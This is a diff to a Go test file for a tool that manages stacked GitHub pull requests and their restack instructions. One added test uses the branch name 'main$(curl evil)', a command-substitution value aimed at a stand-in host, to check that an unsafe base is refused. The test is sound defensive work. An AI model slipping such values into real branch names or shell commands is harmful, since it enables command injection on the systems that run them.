@@ -86,6 +86,12 @@ func TestRestack(t *testing.T) {
 	if err := f.svc.prHealth(ctx, lower.ID, pr, track.PROpen, nil); err != nil {
 		t.Fatal(err)
 	}
+	if got := waitingFor(t, f, upper.ID); len(got) != 0 {
+		t.Errorf("restacked before the poll saved every PR: %q", got)
+	}
+	if err := f.svc.restackMerged(ctx); err != nil {
+		t.Fatal(err)
+	}
 	now, err := f.store.Track(ctx, upper.ID)
 	if err != nil || now.Repos[0].Base != "main" {
 		t.Errorf("after the PR below merged, the base is %q, %v; want main", now.Repos[0].Base, err)
@@ -133,8 +139,8 @@ func mergedBelow(lower track.Track) track.PR {
 }
 
 // A restack goes only to the repo the PR is in, and not to a side track
-// whose PRs there are merged already, as a fan-in's, nor to an
-// archived one.
+// whose PRs there are merged already, as a fan-in's; one that merged
+// while its restack waited drops it.
 func TestRestackOnlyWhatIsStacked(t *testing.T) {
 	ctx := context.Background()
 	f, _, lower, upper := stackedFixture(t)
@@ -157,6 +163,52 @@ func TestRestackOnlyWhatIsStacked(t *testing.T) {
 	}
 	if got := waitingFor(t, f, upper.ID); len(got) != 0 {
 		t.Errorf("a side track whose PR merged already was restacked: %q", got)
+	}
+}
+
+func TestAMootRestackIsDropped(t *testing.T) {
+	ctx := context.Background()
+	f, _, lower, upper := stackedFixture(t)
+	f.svc.GitHub = &fakeGitHub{}
+	below := mergedBelow(lower)
+	if err := f.svc.restack(ctx, lower.ID, below); err != nil {
+		t.Fatal(err)
+	}
+	own, _ := track.ParsePR("https://github.com/acme/api/pull/240")
+	own.State = track.PRMerged
+	if _, err := f.store.SavePR(ctx, upper.ID, own, f.svc.now()); err != nil {
+		t.Fatal(err)
+	}
+	now, _ := f.store.Track(ctx, upper.ID)
+	waiting, _ := f.store.WaitingInstructions(ctx)
+	typed, held, err := f.svc.typeInstruction(ctx, now, "@x", waiting[0])
+	if err != nil || typed || held {
+		t.Errorf("a restack whose side track's PR merged: typed %v, held %v, %v", typed, held, err)
+	}
+	if got := waitingFor(t, f, upper.ID); len(got) != 0 {
+		t.Errorf("still waiting: %q", got)
+	}
+}
+
+// A base branch that isn't safe in a command leaves the restack to the
+// main track.
+func TestAnUnsafeBaseIsTheMainTracks(t *testing.T) {
+	ctx := context.Background()
+	f, main, lower, upper := stackedFixture(t)
+	f.svc.GitHub = &fakeGitHub{}
+	pr := mergedBelow(lower)
+	pr.Health.Base = "main$(curl evil)"
+	if err := f.svc.restack(ctx, lower.ID, pr); err != nil {
+		t.Fatal(err)
+	}
+	if got := waitingFor(t, f, upper.ID); len(got) != 0 {
+		t.Errorf("instructed with an unsafe base: %q", got)
+	}
+	if got := fromGitHub(t, f, main.ID); len(got) != 1 || !strings.HasPrefix(got[0], "event: ") || !strings.Contains(got[0], "you decide") {
+		t.Errorf("the main track's relay: %q", got)
+	}
+	if now, _ := f.store.Track(ctx, upper.ID); now.Repos[0].Base != lower.Repos[0].Branch {
+		t.Errorf("the base became %q", now.Repos[0].Base)
 	}
 }
 
